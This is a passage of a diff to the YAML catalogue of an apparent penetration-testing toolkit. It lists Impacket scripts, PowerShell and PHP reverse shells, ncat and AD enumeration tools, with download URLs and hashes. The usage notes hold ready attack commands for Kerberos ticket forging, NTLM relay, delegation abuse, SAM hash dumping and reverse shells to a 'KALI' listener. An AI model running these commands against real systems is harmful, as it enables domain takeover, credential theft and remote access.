+  - tgt
+  - python
+  finding_triggers:
+  - domain_joined
+  notes: 'Run with: python3 getTGT.py domain/user:pass'
+- name: getST.py
+  display_name: getST
+  description: Impacket - request service ticket using TGT
+  project_url: https://github.com/fortra/impacket
+  upstream_url: https://raw.githubusercontent.com/fortra/impacket/master/examples/getST.py
+  upstream_version: latest
+  license: Apache-2.0
+  sha256: 9767bf9e4e8e077f29e17b771bb52dd4e69563142f0b750943aab1744163de63
+  folder: Impacket
+  categories:
+  - Impacket
+  platform: linux
+  architecture: any
+  tags:
+  - impacket
+  - kerberos
+  - service-ticket
+  - python
+  finding_triggers:
+  - domain_joined
+  notes: 'Run with: python3 getST.py -spn cifs/target domain/user'
+- name: ticketer.py
+  display_name: ticketer
+  description: Impacket - create golden/silver Kerberos tickets
+  project_url: https://github.com/fortra/impacket
+  upstream_url: https://raw.githubusercontent.com/fortra/impacket/master/examples/ticketer.py
+  upstream_version: latest
+  license: Apache-2.0
+  sha256: 9039b8f85469829de12f8ba962942c2c9656324a1ff9cf0c7b7b237a0ea6117d
+  folder: Impacket
+  categories:
+  - Impacket
+  platform: linux
+  architecture: any
+  tags:
+  - impacket
+  - kerberos
+  - golden-ticket
+  - silver-ticket
+  - python
+  finding_triggers:
+  - domain_joined
+  notes: 'Run with: python3 ticketer.py -domain domain.local -nthash HASH -domain-sid SID -extra-sid SID administrator'
+- name: ntlmrelayx.py
+  display_name: ntlmrelayx
+  description: Impacket - NTLM relay attacks to various protocols
+  project_url: https://github.com/fortra/impacket
+  upstream_url: https://raw.githubusercontent.com/fortra/impacket/master/examples/ntlmrelayx.py
+  upstream_version: latest
+  license: Apache-2.0
+  sha256: b014e26d85ca1de047976484954adb98909a0acaf681383053b30c6f4e39b638
+  folder: Impacket
+  categories:
+  - Impacket
+  platform: linux
+  architecture: any
+  tags:
+  - impacket
+  - ntlm
+  - relay
+  - ad
+  - python
+  finding_triggers:
+  - domain_joined
+  notes: 'Run with: python3 ntlmrelayx.py -tf targets.txt -smb2support'
+- name: addcomputer.py
+  display_name: addcomputer
+  description: Impacket - add a computer account to the domain
+  project_url: https://github.com/fortra/impacket
+  upstream_url: https://raw.githubusercontent.com/fortra/impacket/master/examples/addcomputer.py
+  upstream_version: latest
+  license: Apache-2.0
+  sha256: 0fc49b8431baa32215b5f1258360a530cc00a9bcdc50701cbd91968b90a4bfc3
+  folder: Impacket
+  categories:
+  - Impacket
+  platform: linux
+  architecture: any
+  tags:
+  - impacket
+  - ad
+  - computer-account
+  - python
+  finding_triggers:
+  - domain_joined
+  notes: 'Run with: python3 addcomputer.py domain/user:pass -computer-name attacker$ -computer-pass pass'
+- name: rbcd.py
+  display_name: rbcd
+  description: Impacket - Resource-Based Constrained Delegation attack
+  project_url: https://github.com/fortra/impacket
+  upstream_url: https://raw.githubusercontent.com/fortra/impacket/master/examples/rbcd.py
+  upstream_version: latest
+  license: Apache-2.0
+  sha256: ae2a778cc6e567ce4ef0ab352f70e181244f1b3357529e7244e328144272a93a
+  folder: Impacket
+  categories:
+  - Impacket
+  platform: linux
+  architecture: any
+  tags:
+  - impacket
+  - ad
+  - rbcd
+  - delegation
+  - python
+  finding_triggers:
+  - domain_joined
+  notes: 'Run with: python3 rbcd.py domain/user:pass -delegate-to target$ -delegate-from attacker$ -action write'
+- name: Invoke-PowerShellTcp.ps1
+  display_name: Invoke-PowerShellTcp
+  description: Nishang PowerShell reverse TCP shell
+  project_url: https://github.com/samratashok/nishang
+  upstream_url: https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+  upstream_version: latest
+  license: MIT
+  sha256: 0f1e223eaf8b6d71f65960f8b9e14c98ba62e585334a6349bcd02216f4415868
+  folder: Nishang
+  categories:
+  - Shells
+  platform: windows
+  architecture: any
+  tags:
+  - shell
+  - reverse-shell
+  - powershell
+  - nishang
+  finding_triggers:
+  - '*'
+  notes: 'Append: Invoke-PowerShellTcp -Reverse -IPAddress KALI -Port 4444'
+- name: Invoke-PowerShellTcpOneLine.ps1
+  display_name: Invoke-PowerShellTcpOneLine
+  description: Nishang one-liner PowerShell reverse TCP shell
+  project_url: https://github.com/samratashok/nishang
+  upstream_url: https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcpOneLine.ps1
+  upstream_version: latest
+  license: MIT
+  sha256: 2f4c948974da341412ab742e14d8cdd33c1efa22b90135fcfae891f08494ac32
+  folder: Nishang
+  categories:
+  - Shells
+  platform: windows
+  architecture: any
+  tags:
+  - shell
+  - reverse-shell
+  - powershell
+  - nishang
+  - oneliner
+  finding_triggers:
+  - '*'
+  notes: Edit IP/port before use; one-liner format
+- name: php-reverse-shell.php
+  display_name: PHP Reverse Shell
+  description: Pentestmonkey PHP reverse shell for web server exploitation
+  project_url: https://github.com/pentestmonkey/php-reverse-shell
+  upstream_url: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+  upstream_version: latest
+  license: GPL-2.0
+  sha256: b9a06b941da7bef9697ad1e645dc3b15b56e35407a0590e4ec18b8f3543645d9
+  folder: WebShells
+  categories:
+  - Shells
+  platform: linux
+  architecture: any
+  tags:
+  - shell
+  - reverse-shell
+  - php
+  - webshell
+  finding_triggers:
+  - '*'
+  notes: Edit $ip and $port before uploading to web server
+- name: Invoke-ConPtyShell.ps1
+  display_name: Invoke-ConPtyShell
+  description: Fully interactive reverse shell via Windows ConPty API - enables tab completion, vim, su
+  project_url: https://github.com/antonioCoco/ConPtyShell
+  upstream_url: https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1
+  upstream_version: latest
+  license: MIT
+  sha256: 90a17fd47fe1042cd86ae32fba8d9a5ccdef6162578d9c384fe534112700fb64
+  folder: ConPtyShell
+  categories:
+  - Shells
+  platform: windows
+  architecture: any
+  tags:
+  - shell
+  - reverse-shell
+  - interactive
+  - conpty
+  - powershell
+  finding_triggers:
+  - '*'
+  notes: 'Invoke-ConPtyShell KALI 4444; on Kali: stty raw -echo; nc -lvnp 4444'
+- name: ncat
+  display_name: Ncat (Linux)
+  description: Nmap's netcat reimplementation for Linux - supports SSL, IPv6, proxies
+  project_url: https://nmap.org/ncat/
+  upstream_url: https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat
+  upstream_version: latest
+  license: NPSL
+  sha256: 328a7313830e97685b372ff4de89ee0161abe88c50a2250a0b34de7ff4fc6587
+  folder: Netcat
+  categories:
+  - Tunneling
+  - Shells
+  platform: linux
+  architecture: x64
+  tags:
+  - tunneling
+  - shell
+  - netcat
+  - ncat
+  - linux
+  - static
+  finding_triggers:
+  - '*'
+  notes: Static binary; ncat -lvnp 4444
+- name: SharpView.exe
+  display_name: SharpView
+  description: C# port of PowerView - .NET implementation of AD enumeration without PowerShell
+  project_url: https://github.com/tevora-threat/SharpView
+  upstream_url: https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpView.exe
+  upstream_version: latest
+  license: BSD-3-Clause
+  sha256: 88bacdc1543b9f056842668e508b6d9c12ee629b312320e05dd01ac9481349d5
+  folder: SharpView
+  categories:
+  - AD
+  - Enumeration
+  platform: windows
+  architecture: any
+  tags:
+  - ad
+  - enumeration
+  - powerview
+  - bloodhound-alternative
+  finding_triggers:
+  - domain_joined
+  notes: 'Run with: .\SharpView.exe Get-DomainUser'
+- name: lookupsid.py
+  display_name: lookupsid
+  description: Impacket - enumerate domain users and groups via SID brute-forcing
+  project_url: https://github.com/fortra/impacket
+  upstream_url: https://raw.githubusercontent.com/fortra/impacket/master/examples/lookupsid.py
+  upstream_version: latest
+  license: Apache-2.0
+  sha256: 62f5e0077c787c5154443b9bba3fe0af9d7a105377ca6055e4baa633c82ada8d
+  folder: Impacket
+  categories:
+  - Impacket
+  platform: linux
+  architecture: any
+  tags:
+  - impacket
+  - ad
+  - sid
+  - enumeration
+  - python
+  finding_triggers:
+  - domain_joined
+  notes: 'Run with: python3 lookupsid.py domain/user:pass@DC'
+- name: reg.py
+  display_name: reg
+  description: Impacket - remote Windows registry read/write over SMB
+  project_url: https://github.com/fortra/impacket
+  upstream_url: https://raw.githubusercontent.com/fortra/impacket/master/examples/reg.py
+  upstream_version: latest
+  license: Apache-2.0
+  sha256: 04a92dfed1efc4065a1f762ab4bdf2ac5c6286795b2c46256c3aa52436b8239e
+  folder: Impacket
+  categories:
+  - Impacket
+  platform: linux
+  architecture: any
+  tags:
+  - impacket
+  - registry
+  - smb
+  - python
+  finding_triggers:
+  - '*'
+  notes: 'Run with: python3 reg.py domain/user:pass@target query -keyName HKLM\\SAM'
+- name: samrdump.py
+  display_name: samrdump
+  description: Impacket - dump SAM database users and password hashes via MS-SAMR
+  project_url: https://github.com/fortra/impacket
+  upstream_url: https://raw.githubusercontent.com/fortra/impacket/master/examples/samrdump.py
+  upstream_version: latest
+  license: Apache-2.0
+  sha256: 3c0c164515f9b8b974018ffef148ed6e2af5be95346a027005a15db9baef1d6d
+  folder: Impacket
+  categories:
+  - Impacket
+  platform: linux
+  architecture: any
+  tags:
+  - impacket
+  - sam
+  - credentials
+  - python
+  finding_triggers:
+  - '*'
+  notes: 'Run with: python3 samrdump.py domain/user:pass@target'
+- name: services.py
+  display_name: services
+  description: Impacket - remote Windows service management via MS-SCMR
+  project_url: https://github.com/fortra/impacket
+  upstream_url: https://raw.githubusercontent.com/fortra/impacket/master/examples/services.py
+  upstream_version: latest
+  license: Apache-2.0
+  sha256: e8f7830d398c090c85d05e884c9e4ae4e3a4b8dcf116dfcc6afe740e09b50511
+  folder: Impacket
+  categories:
+  - Impacket
+  platform: linux
+  architecture: any
+  tags:
+  - impacket
+  - services
+  - scm
+  - lateral-movement
+  - python
+  finding_triggers:
+  - '*'
+  notes: 'Run with: python3 services.py domain/user:pass@target list'
 categories:
   Enumeration:
-    description: "System enumeration and privilege escalation check tools"
+    description: System enumeration and privilege escalation check tools
     folders:
-      - WinPEAS
-      - LinPEAS
-      - SharpUp
-      - Seatbelt
-      - PowerSploit
-      - PrivescCheck
-      - JAWS
-      - Watson
-      - Sherlock
-      - LinEnum
-      - LSE
-      - LES
-      - pspy
-      - Sysinternals
-      - SharpWMI
-      - RunasCs
-
+    - WinPEAS
+    - LinPEAS
+    - SharpUp
+    - Seatbelt
+    - PowerSploit
+    - PrivescCheck
+    - JAWS
+    - Watson
+    - Sherlock
+    - LinEnum
+    - LSE
+    - LES
+    - pspy
+    - Sysinternals
+    - SharpWMI
+    - RunasCs
   Credentials:
-    description: "Credential extraction and dumping tools"
+    description: Credential extraction and dumping tools
     folders:
-      - LaZagne
-      - Mimikatz
-      - SharpDPAPI
-      - SharpChrome
-      - SharpWeb
-      - Rubeus
-      - SafetyKatz
-      - SharpKatz
-      - SharpSecDump
-      - Snaffler
-      - SharpRoast
-      - LockLess
-      - PowerSploit
-
+    - LaZagne
+    - Mimikatz
+    - SharpDPAPI
+    - SharpChrome
+    - SharpWeb
+    - Rubeus
+    - SafetyKatz
+    - SharpKatz
+    - SharpSecDump
+    - Snaffler
+    - SharpRoast
+    - LockLess
+    - PowerSploit
   TokenAbuse:
-    description: "Token impersonation and privilege escalation via COM/DCOM"
+    description: Token impersonation and privilege escalation via COM/DCOM
     folders:
-      - PrintSpoofer
-      - GodPotato
-      - JuicyPotato
-      - SweetPotato
-      - RoguePotato
-      - LocalPotato
-      - RemotePotato0
-      - CoercedPotato
-      - GenericPotato
-      - SharpEfsPotato
-
+    - PrintSpoofer
+    - GodPotato
+    - JuicyPotato
+    - SweetPotato
+    - RoguePotato
+    - LocalPotato
+    - RemotePotato0
+    - CoercedPotato
+    - GenericPotato
+    - SharpEfsPotato
   AD:
-    description: "Active Directory enumeration and attack tools"
+    description: Active Directory enumeration and attack tools
     folders:
-      - SharpHound
-      - RustHound
-      - Certify
-      - Whisker
-      - KrbRelayUp
-      - ADCSPwn
-      - PetitPotam
-      - SharpLAPS
-      - SharpGPOAbuse
-      - Kerbrute
-      - Farmer
-      - PowerSploit
-
+    - SharpHound
+    - RustHound
+    - Certify
+    - Whisker
+    - KrbRelayUp
+    - ADCSPwn
+    - PetitPotam
+    - SharpLAPS
+    - SharpGPOAbuse
+    - Kerbrute
+    - Farmer
+    - PowerSploit
   Tunneling:
-    description: "Network tunneling and pivoting tools"
+    description: Network tunneling and pivoting tools
     folders:
-      - Chisel
-      - Ligolo
-      - Socat
-      - Netcat
-
+    - Chisel
+    - Ligolo
+    - Socat
+    - Netcat
   Impacket:
-    description: "Impacket Python scripts for Windows protocol interaction"
+    description: Impacket Python scripts for Windows protocol interaction
     folders:
-      - Impacket
-
+    - Impacket
   Shells:
-    description: "Reverse shells and shell utilities"
+    description: Reverse shells and shell utilities
     folders:
-      - Nishang
-      - WebShells
-      - Netcat
+    - Nishang
+    - WebShells
+    - Netcat
